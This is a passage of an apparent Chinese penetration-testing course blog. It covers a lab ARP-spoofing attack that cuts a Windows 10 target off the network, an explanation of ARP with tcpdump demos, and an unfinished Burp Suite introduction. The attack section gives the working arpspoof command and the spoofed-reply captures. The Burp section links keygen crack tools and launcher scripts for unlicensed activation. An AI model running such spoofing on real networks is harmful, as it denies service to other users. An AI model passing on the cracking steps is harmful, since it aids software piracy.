class="language-none">ping 192.168.70.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​1.4 win10 查看arp表，记录网关的信息</p><pre class="line-numbers language-none"><code class="language-none">arp -a |findstr 192.168.70.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2.kali进行断网攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.2 -t 192.168.70.130-i:指定网卡-r:指定网关ip-t:指定靶机ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.win10 查看网络连接 和 kali 的网络链接</strong></p><pre class="line-numbers language-none"><code class="language-none">ping www.mashibing.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4.win10查看此时的arp表</strong></p><pre class="line-numbers language-none"><code class="language-none">arp -a 或者arp -a |findstr 192.168.70.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>5.结束断网攻击</strong></p><pre class="line-numbers language-none"><code class="language-none">ctrl+C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>6.win10重新查看网络状态</strong></p><pre class="line-numbers language-none"><code class="language-none">ping www.mashibing.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>7.win10重新查看arp表</strong></p><pre class="line-numbers language-none"><code class="language-none">arp -a |findstr 192.168.70.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-ARP断网攻击原理深入分析"><a href="#5-ARP断网攻击原理深入分析" class="headerlink" title="5.ARP断网攻击原理深入分析"></a>5.ARP断网攻击原理深入分析</h2><p>**1.ARP攻击断网的过程 **</p><pre class="line-numbers language-none"><code class="language-none">0:c:29:fc:66:46 1c:69:7a:a4:cf:92 0806 42: arp reply 192.168.70.2 is-at 0:c:29:fc:66:460:c:29:fc:66:46 e4:3a:6e:35:98:0 0806 42: arp reply 192.168.70.130 is-at 0:c:29:fc:66:46ARP攻击机器 不停的在告诉 192.168.70.2（网关）  192.168.70.130 的mac地址是 00:0c:29:fc:66:46ARP攻击机器 不停的在告诉 192.168.70.130（靶机） 192.168.70.2 的mac地址是 00:0c:29:fc:66:46Ctrl+C停止攻击后0:c:29:fc:66:46 1c:69:7a:a4:cf:92 0806 42: arp reply 192.168.70.2 is-at e4:3a:6e:35:98:00:c:29:fc:66:46 e4:3a:6e:35:98:0 0806 42: arp reply 192.168.70.130 is-at 1c:69:7a:a4:cf:92ARP攻击机器 重新告诉 192.168.70.130（靶机） 192.168.70.2 的mac地址是 e4:3a:6e:35:98:0ARP攻击机器 重新告诉 192.168.70.2（网关）  192.168.70.130 的mac地址是 1c:69:7a:a4:cf:92<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.ARP断网原理图：</strong></p><p><img src="assets/%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%9B%BE.png" alt="断网攻击原理图"></p><h2 id="6-课堂小结"><a href="#6-课堂小结" class="headerlink" title="6.课堂小结"></a>6.课堂小结</h2><p>请看思维导图：ARP断网攻击课程总结.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.ARP原理</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/1.arp-yuan-li/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/27arp/1.arp-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="一-准备"><a href="#一-准备" class="headerlink" title="一.准备"></a>一.准备</h2><p>1.准备kali虚拟机 （原理演示机）</p><p>2.准备centos7虚拟机 （靶机）</p><h2 id="二-ARP协议工作原理"><a href="#二-ARP协议工作原理" class="headerlink" title="二.ARP协议工作原理"></a>二.ARP协议工作原理</h2><h4 id="什么是ARP"><a href="#什么是ARP" class="headerlink" title="什么是ARP"></a>什么是ARP</h4><p>地址解析协议，即ARP（Address Resolution Protocol），是根据<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>获取<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129">物理地址</a>的一个<a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>。</p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>ARP协议规定,每台计算机都需要一个<strong>ARP表,用来保存IP地址和MAC地址的映射关系</strong> 。访问IP地址的时候就去查ARP表,从而找到对应的MAC地址。</p><p>如果ARP表中匹配不到,就会使用<strong>广播</strong>的方式发送一个ARP请求 ，目标主机收到请求后会使用<strong>单播</strong>的方式返回一个ARP响应,告知自己的MAC地址 。</p><p>拿到MAC地址后,会将映射关系缓存到ARP表,而后传递到数据链路层进行解析转换。</p><h2 id="三-ARP-协议的作用"><a href="#三-ARP-协议的作用" class="headerlink" title="三.ARP 协议的作用"></a>三.ARP 协议的作用</h2><p>网络中的数据传输所依赖的是MAC地址而不是IP地址，<strong>ARP协议负责将IP地址转换为MAC地址</strong>。</p><p>ARP协议的主要工作就是建立、查询、更新、删除ARP表项。</p><h2 id="四-ARP常用命令"><a href="#四-ARP常用命令" class="headerlink" title="四.ARP常用命令"></a>四.ARP常用命令</h2><ol><li>查询arp表：</li></ol><pre class="line-numbers language-none"><code class="language-none">arp -a   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20211018181543457.png" alt="image-20211018181543457"></p><p>2.删除表内某个IP</p><pre class="line-numbers language-none"><code class="language-none">arp -d IP      <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.tcp抓某块网卡的所有arp请求  </p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0 -nn arp     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.tcp抓取指定ip的请求</p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0 -nn arp and host IP     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​         </p><h2 id="五-ARP工作过程演示"><a href="#五-ARP工作过程演示" class="headerlink" title="五.ARP工作过程演示"></a>五.ARP工作过程演示</h2><p>在centos7上通过抓包来了解arp的工作过程：</p><p>1.首先查看一下该机器有没有 ip:192.168.110.13 的mac地址</p><pre class="line-numbers language-none"><code class="language-none">arp -a如果存在则先删除掉arp -d 192.168.110.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.在centos7上抓包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0 -nn arp  或者 tcpdump -i eth0 -nn arp and host 192.168.110.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.ping一下该ip</p><pre class="line-numbers language-none"><code class="language-none">ping 192.168.110.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.查看抓包结果</p><pre class="line-numbers language-none"><code class="language-none">06:07:58.827256 ARP, Request who-has 192.168.110.13 tell 192.168.110.26, length 28这句话的意思是，请问谁是192.168.110.13 ，请将你的mac地址告诉给 192.168.110.2606:07:58.827858 ARP, Reply 192.168.110.13 is-at 00:0c:29:90:e6:8d, length 46这句话的意思是，我是92.168.110.13，我的mac地址是：00:0c:29:90:e6:8d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.查看最新的ARP表，看看是否绑定了mac地址</p><pre class="line-numbers language-none"><code class="language-none">arp -a? (192.168.110.13) at 00:0c:29:90:e6:8d [ether] on eth0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6.ARP的请求是一直不间断的在自动发送的，一台计算机会通信进行以下过程</p><ol><li>主动询问网段下的IP的MAC地址</li><li>主动告诉别人我的IP和MAC地址</li><li>根据应答结果实时更新ARP表的绑定关系</li></ol><h2 id="六-总结"><a href="#六-总结" class="headerlink" title="六.总结"></a>六.总结</h2><p>1.ARP协议负责将IP地址转换为MAC地址。或者说 ARP协议负责将IP地址和MAC地址进行绑定。</p><p>2.ARP协议的主要工作就是建立、查询、更新、删除ARP表项。</p><p>3.ARP的特性：无需人为干预，一直在进行轮询和应答</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/26burp-suite/burpsuite/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/26burp-suite/burpsuite/</url>
      
        <content type="html"><![CDATA[<h1 id="Burp-Suite基本介绍"><a href="#Burp-Suite基本介绍" class="headerlink" title="Burp Suite基本介绍"></a>Burp Suite基本介绍</h1><h2 id="Burp历史版本"><a href="#Burp历史版本" class="headerlink" title="Burp历史版本"></a>Burp历史版本</h2><p><a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a></p><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><ul><li>目标：测试网站安全性 </li><li>手段：抓HTTP包、改HTTP包；自动请求、过滤响应 </li><li>场景：SQL注入、文件上传、XSS、CSRF、FUZZ、重放 攻击、密码爆破、爬取数据、漏洞扫描……</li></ul><h2 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h2><ul><li>企业版 Enterprise Edition </li><li>社区版 Community Edition </li><li>专业版 Professional （$399/year)</li></ul><h2 id="运行平台"><a href="#运行平台" class="headerlink" title="运行平台"></a>运行平台</h2><ul><li>Jar（推荐） </li><li>Linux </li><li>MacOS（ARM、Intel） </li><li>Window</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="本地文档"><a href="#本地文档" class="headerlink" title="本地文档"></a>本地文档</h3><p>问号按钮</p><h3 id="在线文档"><a href="#在线文档" class="headerlink" title="在线文档"></a>在线文档</h3><p><a href="https://portswigger.net/support">https://portswigger.net/support</a> </p><p><a href="https://portswigger.net/burp/documentation/desktop">https://portswigger.net/burp/documentation/desktop</a></p><h3 id="视频学习和练习平台"><a href="#视频学习和练习平台" class="headerlink" title="视频学习和练习平台"></a>视频学习和练习平台</h3><p><a href="https://portswigger.net/web-security">https://portswigger.net/web-security</a></p><h3 id="问答社区"><a href="#问答社区" class="headerlink" title="问答社区"></a>问答社区</h3><p><a href="https://forum.portswigger.net/">https://forum.portswigger.net/</a></p><h1 id="Burp-Suite配置"><a href="#Burp-Suite配置" class="headerlink" title="Burp Suite配置"></a>Burp Suite配置</h1><h2 id="Burp-jar包"><a href="#Burp-jar包" class="headerlink" title="Burp jar包"></a>Burp jar包</h2><h3 id="Burp-jar包-1"><a href="#Burp-jar包-1" class="headerlink" title="Burp jar包"></a>Burp jar包</h3><p>推荐2021+，jar包版本 </p><p><a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a></p><h3 id="JRE环境"><a href="#JRE环境" class="headerlink" title="JRE环境"></a>JRE环境</h3><ol><li>JDK类型：推荐解压版（zip） </li><li>JDK版本：推荐JDK11 （配合Burp 2021）</li></ol><p><a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a></p><h4 id="JDK11环境变量配置"><a href="#JDK11环境变量配置" class="headerlink" title="JDK11环境变量配置"></a>JDK11环境变量配置</h4><table><thead><tr><th>变量</th><th>值</th></tr></thead><tbody><tr><td>JAVA_HOME</td><td>JDK解压的根路径，比如 D:\jdk-11.0.11</td></tr><tr><td>PATH</td><td>%JAVA_HOME%\bin</td></tr></tbody></table><h3 id="激活和汉化包"><a href="#激活和汉化包" class="headerlink" title="激活和汉化包"></a>激活和汉化包</h3><h4 id="激活软件下载地址："><a href="#激活软件下载地址：" class="headerlink" title="激活软件下载地址："></a>激活软件下载地址：</h4><p><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases">https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases</a> </p><h4 id="汉化包地址："><a href="#汉化包地址：" class="headerlink" title="汉化包地址："></a>汉化包地址：</h4><p><a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases/download/2.0/BurpLoaderKeygenCn.jar">https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases/download/2.0/BurpLoaderKeygenCn.jar</a></p><h2 id="Burp-Suite启动激活"><a href="#Burp-Suite启动激活" class="headerlink" title="Burp Suite启动激活"></a>Burp Suite启动激活</h2><h3 id="命令行方式启动"><a href="#命令行方式启动" class="headerlink" title="命令行方式启动"></a>命令行方式启动</h3><p><strong>burp_start.bat</strong>，内容： </p><pre class="line-numbers language-none"><code class="language-none">@echo off cmd /k "java -jar BurpLoaderKeygen.jar"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="VBS启动"><a href="#VBS启动" class="headerlink" title="VBS启动"></a>VBS启动</h3><pre class="line-numbers language-none"><code class="language-none">set ws=WScript.CreateObject("WScript.Shell") ws.Run "burp_start.bat",0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Burp-Suite配置-1"><a href="#Burp-Suite配置-1" class="headerlink" title="Burp Suite配置"></a>Burp Suite配置</h2><h3 id="汉化说明"><a href="#汉化说明" class="headerlink" title="汉化说明"></a>汉化说明</h3><p>如果执行了上面的英文破解程序，需要先<strong>反向激活</strong>，让激活失效，再<strong>删除</strong>英文破解程序产生的<strong>config.cfg</strong>文件。</p><p>接着使用中文的破解程序激活。</p><p><strong>burp_cn_start.bat</strong> </p><pre class="line-numbers language-none"><code class="language-none">@echo off cmd /k "java -jar BurpLoaderKeygenCn.jar"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>VBS启动</strong></p><pre class="line-numbers language-none"><code class="language-none">set ws=WScript.CreateObject("WScript.Shell") ws.Run "burp_cn_start.bat",0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Burp-Suite模块"><a href="#Burp-Suite模块" class="headerlink" title="Burp Suite模块"></a>Burp Suite模块</h1><h2 id="Burp-Suite界面布局"><a href="#Burp-Suite界面布局" class="headerlink" title="Burp Suite界面布局"></a>Burp Suite界面布局</h2><h3 id="参考手册目录全文"><a href="#参考手册目录全文" class="headerlink" title="参考手册目录全文"></a>参考手册目录全文</h3><p><a href="https://portswigger.net/burp/documentation/contents">https://portswigger.net/burp/documentation/contents</a></p><h3 id="界面总览"><a href="#界面总览" class="headerlink" title="界面总览"></a>界面总览</h3><p><img src="assets/image-20221219180736217.png" alt="image-20221219180736217"></p><h3 id="旧版对比"><a href="#旧版对比" class="headerlink" title="旧版对比"></a>旧版对比</h3><p><img src="assets/image-20221219180831190.png" alt="image-20221219180831190"></p><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><h4 id="Burp"><a href="#Burp" class="headerlink" title="Burp"></a>Burp</h4><p><img src="assets/image-20221219181021718.png" alt="image-20221219181021718"></p><ol><li>搜索内容 </li><li>配置库 </li><li>用户选项 </li><li>Infiltrator </li><li>Clickbandit </li><li>Collaborator clien</li></ol><h4 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h4><p><img src="assets/image-20221219181129597.png" alt="image-20221219181129597"></p><ol><li>工程配置 </li><li>重命名 </li><li>保存备份 </li><li>导入配置 </li><li>导入遗留状态文件</li></ol><h4 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h4><p><img src="assets/image-20221219181216302.png" alt="image-20221219181216302"></p><ol><li>发起攻击 </li><li>打开工作空间 </li><li>扫描预定义的插入点</li><li>被动扫描 主动扫描</li><li>发送到Repeater</li><li>保存、加载、复制配置</li><li>打开新标签时的操作</li><li>自动标记payload位置</li><li>配置预定义字典</li><li>关闭攻击结果时的偏好</li></ol><h4 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h4><p><img src="assets/image-20221219181443476.png" alt="image-20221219181443476"></p><ol><li>更新 Content-Length </li><li>解压压缩的数据 </li><li>跟随重定向跳转</li><li>重定向的cookie处理</li><li>跨域跳转</li><li>HTTP1 行结尾</li><li>HTTP2 连接重用</li><li>剥离 HTTP2 连接头</li><li>允许 HTTP2 ALPN 覆盖</li></ol><p><a href="https://portswigger.net/burp/documentation/desktop/tools/repeater/options">https://portswigger.net/burp/documentation/desktop/tools/repeater/options</a></p><h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><p><img src="assets/image-20221219181619180.png" alt="image-20221219181619180"></p><p>剥离窗口</p><h4 id="Help"><a href="#Help" class="headerlink" title="Help"></a>Help</h4><p><img src="assets/image-20221219181646974.png" alt="image-20221219181646974"></p><ol><li>离线文档</li><li>上手用BP做渗透测试</li><li>支持中心（在线）</li><li>更新记录 </li><li>上报bug 运行诊断 </li><li>内置浏览器健康检查</li><li>许可证 </li><li>检查更新</li><li>下载其他安装器 </li><li>删除BP</li></ol><h2 id="模块总体概括"><a href="#模块总体概括" class="headerlink" title="模块总体概括"></a>模块总体概括</h2><h3 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h3><p><a href="https://portswigger.net/burp/documentation/desktop/tools">https://portswigger.net/burp/documentation/desktop/tools</a></p><h3 id="Dashbord仪表盘"><a href="#Dashbord仪表盘" class="headerlink" title="Dashbord仪表盘"></a>Dashbord仪表盘</h3><ul><li>扫描 </li><li>任务 Tasks </li><li>事件日志 Event Log </li><li>漏洞问题 Issue activity</li></ul><p><a href="https://portswigger.net/burp/documentation/desktop/dashboard">https://portswigger.net/burp/documentation/desktop/dashboard</a></p><h3 id="Target-目标模块"><a href="#Target-目标模块" class="headerlink" title="Target 目标模块"></a>Target 目标模块</h3><ul><li>生成站点地图（sitemap） </li><li>设置扫描域（target scope） </li><li>生成安全分析</li></ul><h3 id="Proxy-代理模块"><a href="#Proxy-代理模块" class="headerlink" title="Proxy 代理模块"></a>Proxy 代理模块</h3><p>拦截浏览器的HTTP数据包（包括请求和响应）</p><p><img src="assets/image-20221219182424329.png" alt="image-20221219182424329"></p><h3 id="Intruder渗透模块"><a href="#Intruder渗透模块" class="headerlink" title="Intruder渗透模块"></a>Intruder渗透模块</h3><p>对拦截到的请求（地址），设置攻击载荷 （payload），利用<strong>字典</strong>进行渗透测试 </p><p>比如：目录扫描、密码暴力破解、压力测试、FUZZ等等</p><h3 id="Repeater重放模块"><a href="#Repeater重放模块" class="headerlink" title="Repeater重放模块"></a>Repeater重放模块</h3><ol><li>分析每一步具体的请求和响应内容 </li><li>修改请求和响应内容 </li><li>重发请求内容</li></ol><h3 id="Sequencer-序列器模块"><a href="#Sequencer-序列器模块" class="headerlink" title="Sequencer 序列器模块"></a>Sequencer 序列器模块</h3><p>用来评估Token、Session等关键字段 </p><p>是否可以伪造（是否固定、是否可预测）</p><p><img src="assets/image-20221219182713921.png" alt="image-20221219182713921"></p><h3 id="Decoder-解码器模块"><a href="#Decoder-解码器模块" class="headerlink" title="Decoder 解码器模块"></a>Decoder 解码器模块</h3><p>对请求数据进行编码、解码</p><h3 id="Comparer比较器模块"><a href="#Comparer比较器模块" class="headerlink" title="Comparer比较器模块"></a>Comparer比较器模块</h3><p>对两次请求的结果进行对比</p><h3 id="Extender-扩展模块"><a href="#Extender-扩展模块" class="headerlink" title="Extender 扩展模块"></a>Extender 扩展模块</h3><p>对插件进行管理</p><h1 id="Burp-Proxy模块"><a href="#Burp-Proxy模块" class="headerlink" title="Burp Proxy模块"></a>Burp Proxy模块</h1><h2 id="网络代理"><a href="#网络代理" class="headerlink" title="网络代理"></a>网络代理</h2><p><img src="assets/image-20221219183410409.png" alt="image-20221219183410409"></p><h2 id="网络代理的作用"><a href="#网络代理的作用" class="headerlink" title="网络代理的作用"></a>网络代理的作用</h2><ul><li>突破IP限制 </li><li>隐藏IP </li><li>加速访问</li><li>……</li></ul><h2 id="Burp代理的作用"><a href="#Burp代理的作用" class="headerlink" title="Burp代理的作用"></a>Burp代理的作用</h2><p>拦截HTTP(S)请求，并对请求和响应进行处理和利用</p><h2 id="与Fiddler、WireShark的区别"><a href="#与Fiddler、WireShark的区别" class="headerlink" title="与Fiddler、WireShark的区别"></a>与Fiddler、WireShark的区别</h2><table><thead><tr><th>对比项</th><th>Burp</th><th>Fiddler</th><th>WireShark</th></tr></thead><tbody><tr><td>平台</td><td>多平台</td><td>Windows</td><td>多平台</td></tr><tr><td>定位</td><td>渗透测试套件</td><td>Web调试工具</td><td>网络封包分析工具</td></tr><tr><td>功能</td><td>渗透测试</td><td>调试HTTP请求</td><td>分析数据</td></tr></tbody></table><h2 id="浏览器代理设置"><a href="#浏览器代理设置" class="headerlink" title="浏览器代理设置"></a>浏览器代理设置</h2><p><img src="assets/image-20221219183719656.png" alt="image-20221219183719656"></p><ul><li>Chrome扩展插件Crx：<a href="https://crxdl.com/">https://crxdl.com</a></li><li>下载Proxy SwitchySharp</li></ul><h2 id="Burp-Suite代理设置"><a href="#Burp-Suite代理设置" class="headerlink" title="Burp Suite代理设置"></a>Burp Suite代理设置</h2><h3 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h3><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>Forward</td><td>放行本次拦截的包，发送到服务器</td></tr><tr><td>Drop</td><td>丢弃本次拦截的包</td></tr><tr><td>on/off</td><td>拦截开关</td></tr><tr><td>Action</td><td>对数据的操作</td></tr><tr><td>Open in Browser</td><td>打开内置浏览器</td></tr></tbody></table><h3 id="Options选项"><a href="#Options选项" class="headerlink" title="Options选项"></a>Options选项</h3><table><thead><tr><th>操作</th><th>描述</th></tr></thead><tbody><tr><td>Proxy Listeners</td><td>监听器</td></tr><tr><td>Intercept Client Requests</td><td>请求拦截规则</td></tr><tr><td>Intercept Server Response</td><td>响应拦截规则</td></tr><tr><td>Response Modification</td><td>响应结果修改</td></tr><tr><td>Match and Replace</td><td>匹配和替换</td></tr><tr><td>TLS Pass Through</td><td>TLS穿透</td></tr><tr><td>Miscellaneous</td><td>杂项</td></tr></tbody></table><h2 id="Burp-Suite拦截HTTPS"><a href="#Burp-Suite拦截HTTPS" class="headerlink" title="Burp Suite拦截HTTPS"></a>Burp Suite拦截HTTPS</h2><h3 id="网站的证书的作用"><a href="#网站的证书的作用" class="headerlink" title="网站的证书的作用"></a>网站的证书的作用</h3><ol><li>操作系统安装根证书，里面有CA的公钥 </li><li>CA颁发的证书，包含机构的公钥，并且用CA的公钥对机构公钥摘要加签 </li><li>浏览器利用CA的公钥对摘要进行验签，确定机构公钥合法 </li><li>浏览器用机构的公钥与服务器协商会话密钥 </li><li>浏览器与服务器用会话密钥通信</li></ol><p><img src="assets/image-20221219184300307.png" alt="image-20221219184300307"></p><p><img src="assets/image-20221219184308582.png" alt="image-20221219184308582"></p><h3 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h3><p><img src="assets/image-20221219184327303.png" alt="image-20221219184327303"></p><h1 id="Burp-Target模块"><a href="#Burp-Target模块" class="headerlink" title="Burp Target模块"></a>Burp Target模块</h1><h2 id="Burp渗透测试流程"><a href="#Burp渗透测试流程" class="headerlink" title="Burp渗透测试流程"></a>Burp渗透测试流程</h2><p><img src="assets/image-20221219184447840.png" alt="image-20221219184447840"></p><h2 id="Target模块的作用"><a href="#Target模块的作用" class="headerlink" title="Target模块的作用"></a>Target模块的作用</h2><h3 id="与HTTP-History的区别"><a href="#与HTTP-History的区别" class="headerlink" title="与HTTP History的区别"></a>与HTTP History的区别</h3><ol><li>HTTP History按<strong>时间</strong>顺序记录 </li><li>Target按<strong>主机</strong>或者<strong>域名</strong>分类记录</li></ol><p><img src="assets/image-20221219184545443.png" alt="image-20221219184545443"></p><h3 id="Target模块的作用-1"><a href="#Target模块的作用-1" class="headerlink" title="Target模块的作用"></a>Target模块的作用</h3><ol><li>把握网站的整体情况 </li><li>对一次工作的域进行分析 </li><li>分析网站存在的攻击面</li></ol><h3 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h3><p>对一个软件系统可以采取的攻击方法集合，一个软件 的攻击面越大安全风险就越大。 </p><p>包括：字段、协议、接口、服务、硬件的攻击点。</p><h2 id="Target设置作用域"><a href="#Target设置作用域" class="headerlink" title="Target设置作用域"></a>Target设置作用域</h2><h3 id="同一个域"><a href="#同一个域" class="headerlink" title="同一个域"></a>同一个域</h3><table><thead><tr><th>域1</th><th>域2</th><th>同域</th><th>原因</th></tr></thead><tbody><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="http://www.wuya.com/index.html">http://www.wuya.com/index.html</a>  <a href="http://www.wuya.com/admin?a=1">http://www.wuya.com/admin?a=1</a></td><td>YES</td><td>-</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="https://www.wuya.com/">https://www.wuya.com/</a></td><td>NO</td><td>协议</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="http://www.wuya.cn/">http://www.wuya.cn/</a></td><td>NO</td><td>主域名</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com/</a></td><td><a href="http://blog.wuya.com/">http://blog.wuya.com/</a></td><td>NO</td><td>子域名</td></tr><tr><td><a href="http://www.wuya.com/">http://www.wuya.com:80/</a></td><td><a href="http://www.wuya.com:7298/">http://www.wuya.com:7298/</a></td><td>NO</td><td>端口</td></tr></tbody></table><ul><li>协议、域名、端口必须相同 </li><li>目录、文件、参数可以不同</li></ul><h3 id="限定域的范围"><a href="#限定域的范围" class="headerlink" title="限定域的范围"></a>限定域的范围</h3><p>例如： </p><p>只拦截：<a href="https://www.wuya.com/">https://www.wuya.com/</a> </p><p>不拦截：<a href="https://www.wuya.com/blog">https://www.wuya.com/blog</a></p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ol><li>限定Sitemap和HTTP history记录哪些域的内容 </li><li>限定Spider抓取哪些域的内容 </li><li>限定Scanner扫描哪些域的安全漏洞</li></ol><h2 id="站点地图Sitemap"><a href="#站点地图Sitemap" class="headerlink" title="站点地图Sitemap"></a>站点地图Sitemap</h2><h3 id="站点地图记录类型"><a href="#站点地图记录类型" class="headerlink" title="站点地图记录类型"></a>站点地图记录类型</h3><ol><li>自动（爬行） </li><li>手动（浏览器访问）</li></ol><h2 id="对结果进行操作"><a href="#对结果进行操作" class="headerlink" title="对结果进行操作"></a>对结果进行操作</h2><h3 id="右键菜单"><a href="#右键菜单" class="headerlink" title="右键菜单"></a>右键菜单</h3><p><img src="assets/image-20221219191216277.png" alt="image-20221219191216277"></p><h3 id="Referer字段"><a href="#Referer字段" class="headerlink" title="Referer字段"></a>Referer字段</h3><p>作用：告诉服务器当前请求是从哪个页面链接过来的</p><p> 应用场景： </p><ol><li>来源统计 </li><li>防盗链</li></ol><h1 id="Burp-扫描功能"><a href="#Burp-扫描功能" class="headerlink" title="Burp 扫描功能"></a>Burp 扫描功能</h1><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://portswigger.net/burp/documentation/scanner">https://portswigger.net/burp/documentation/scanner</a> </p><p><a href="https://portswigger.net/burp/documentation/desktop/scanning">https://portswigger.net/burp/documentation/desktop/scanning</a></p><p> 模块总体介绍： </p><p><a href="https://portswigger.net/burp/vulnerability-scanner">https://portswigger.net/burp/vulnerability-scanner</a> </p><p>扫描功能的使用： </p><p><a href="https://portswigger.net/burp/documentation/desktop/getting-started/running-your-first-scan">https://portswigger.net/burp/documentation/desktop/getting-started/running-your-first-scan</a> </p><p>收录的漏洞 </p><p><a href="https://portswigger.net/kb/issues">https://portswigger.net/kb/issues</a></p><h2 id="漏洞扫描整体介绍"><a href="#漏洞扫描整体介绍" class="headerlink" title="漏洞扫描整体介绍"></a>漏洞扫描整体介绍</h2><h3 id="漏洞扫描与工具"><a href="#漏洞扫描与工具" class="headerlink" title="漏洞扫描与工具"></a>漏洞扫描与工具</h3><p>AWVS、Appscan、Nessus、Openvas、Goby、 Xray、ZAP……</p><h3 id="新版BP"><a href="#新版BP" class="headerlink" title="新版BP"></a>新版BP</h3><p><img src="assets/image-20221219191758077.png" alt="image-20221219191758077"></p><p>爬行 Crwal </p><p>审计 Audit</p><h3 id="核心内容"><a href="#核心内容" class="headerlink" title="核心内容"></a>核心内容</h3><table><thead><tr><th>内容</th><th>描述</th></tr></thead><tbody><tr><td>Scan（<strong>主动</strong>扫描）</td><td>给定地址，爬取内容，检测漏洞</td></tr><tr><td>Live task（<strong>被动</strong>扫描）</td><td>对经过Proxy、Repeater、Intruder的请 求进行漏洞检测</td></tr><tr><td>live passive <strong>crawl</strong> from proxy(all traffic)</td><td>来自Proxy的被动流量抓取</td></tr><tr><td>live <strong>audit</strong> from proxy(all traffic)</td><td>流量的实时<strong>审计</strong></td></tr></tbody></table><h3 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h3><ul><li>Actively Scan：主动扫描 = Crawl and audit </li><li>Passively Scan：被动扫描 = Live audit</li></ul><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><ul><li><p>方式：爬取所有链接，检测漏洞 </p></li><li><p>特点：发送大量请求 </p></li><li><p>使用场合：开发、测试环境 </p></li><li><p>针对漏洞： 